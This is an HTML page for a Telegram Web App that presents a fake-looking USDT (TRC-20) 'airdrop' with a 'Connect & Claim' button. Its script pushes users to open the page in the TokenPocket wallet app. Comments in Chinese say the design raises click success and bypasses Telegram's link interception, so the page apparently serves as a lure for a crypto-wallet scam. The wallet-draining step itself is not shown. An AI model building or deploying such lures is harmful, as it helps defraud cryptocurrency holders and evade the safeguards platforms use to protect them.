<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.notificationOccurred('success');
    
    // 1. 获取当前网页地址
    const currentUrl = window.location.href;
    
    // 2. 使用 TokenPocket 的官方中转链接 (Universal Link)
    // 这种链接本质是 https，Telegram 不会拦截
    const tpUniversalLink = `https://tokenpocket.github.io/tp-url-common/index.html?url=${encodeURIComponent(currentUrl)}`;

    // 3. 视觉反馈
    const terminal = document.getElementById('terminal');
    terminal.innerHTML += "<p style='color:#0f0'>> [BYPASS]: USING_UNIVERSAL_PROTOCOL...</p>";
    terminal.innerHTML += "<p style='color:#ff0'>> [REDIRECT]: LAUNCHING_EXTERNAL_INTERFACE...</p>";

    // 4. 执行跳转
    // try_browser: true 会强制尝试用系统浏览器或外部方式打开，绕过 Telegram 内部拦截
    tg.openLink(tpUniversalLink, { try_browser: true });
}
</script>
</body>
</html>
